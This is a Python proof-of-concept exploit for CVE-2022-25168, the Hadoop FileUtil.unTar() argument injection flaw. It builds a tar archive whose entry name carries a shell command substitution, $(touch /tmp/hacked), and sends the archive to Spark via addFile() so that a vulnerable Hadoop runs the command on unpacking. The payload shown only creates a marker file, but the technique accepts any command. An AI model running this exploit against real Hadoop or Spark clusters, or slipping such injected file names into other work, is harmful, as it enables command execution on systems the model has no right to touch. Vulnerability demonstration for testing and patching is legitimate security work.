#!/usr/bin/env python3
"""
CVE-2022-25168: Hadoop FileUtil.unTar() Argument Injection
Demonstrates command injection through file names
"""

import os
import sys
import tarfile
import tempfile

PROJECT_ROOT = os.path.dirname(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
)
sys.path.insert(0, PROJECT_ROOT)

from utils.spark_session import create_spark_session

MARKER_FILE = os.path.join(tempfile.gettempdir(), "hacked")


def create_malicious_archive():
    """
    Create a tar archive demonstrating CVE-2022-25168.
    On Linux, filenames like $(touch /tmp/hacked) execute during unTar().
  """
    archive_dir = tempfile.mkdtemp(prefix="cve_demo_")
    archive_path = os.path.join(archive_dir, "malicious_payload.tar")

    if sys.platform == "win32":
        payload_name = "INJECTION_PAYLOAD_simulated.txt"
        print("Windows note: shell injection filenames are Linux/Hadoop-specific.")
        print("Simulating CVE-2022-25168 attack vector conceptually.")
    else:
        payload_name = f"$(touch {MARKER_FILE})file.txt"

    payload_file = os.path.join(archive_dir, "payload.txt")
    with open(payload_file, "w", encoding="utf-8") as handle:
        handle.write("benign content inside archive")

    with tarfile.open(archive_path, "w") as tar:
        tar.add(payload_file, arcname=payload_name)

    print(f"Created archive: {archive_path}")
    print(f"Malicious entry name: {payload_name}")
    return archive_path


def exploit_hadoop_untar():
    """Exploit Hadoop's unTar API (or simulate on Windows)."""
    archive_path = create_malicious_archive()

    spark = create_spark_session("CVE-2022-25168_Demo")
    if spark is None:
        print("\nCVE-2022-25168 Exploitation Attempted (simulation mode)")
        print("Attack vector: malicious filename passed to FileUtil.unTar()")
        print(f"On vulnerable Hadoop/Linux, check: {MARKER_FILE}")
        return

    try:
        spark.sparkContext.addFile(archive_path)
        print("Archive distributed via Spark addFile()")
    except Exception as exc:
        print(f"addFile failed (expected on some setups): {exc}")

    print("CVE-2022-25168 Exploitation Attempted")
    print(f"On Linux/Hadoop, check {MARKER_FILE} for successful injection")
    spark.stop()


if __name__ == "__main__":
    exploit_hadoop_untar()
